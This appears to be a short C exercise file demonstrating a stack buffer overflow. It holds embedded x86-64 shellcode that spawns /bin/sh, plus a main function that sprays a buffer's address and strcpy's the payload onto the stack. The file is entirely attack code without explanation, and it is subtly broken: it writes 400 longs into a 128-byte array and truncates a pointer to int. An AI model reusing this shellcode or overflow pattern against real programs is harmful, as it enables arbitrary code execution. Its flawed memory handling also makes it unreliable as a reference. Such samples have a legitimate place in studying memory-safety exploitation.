unsigned char shellcode[] = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
		       "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
		       "\x54\x5f\x6a\x3b\x58\x0f\x05";

char large_string[128];

void main() {
	char buffer[96];
	int i;
	long *long_ptr = (long *) large_string;
	
	//printf("%d", sizeof(shellcode));

	for(i = 0; i < 400; i++)
		*(long_ptr + i) = (int) buffer;

	for(i = 0; i < strlen(shellcode); i++)
		large_string[i] = shellcode[i];

	strcpy(buffer, large_string);

}
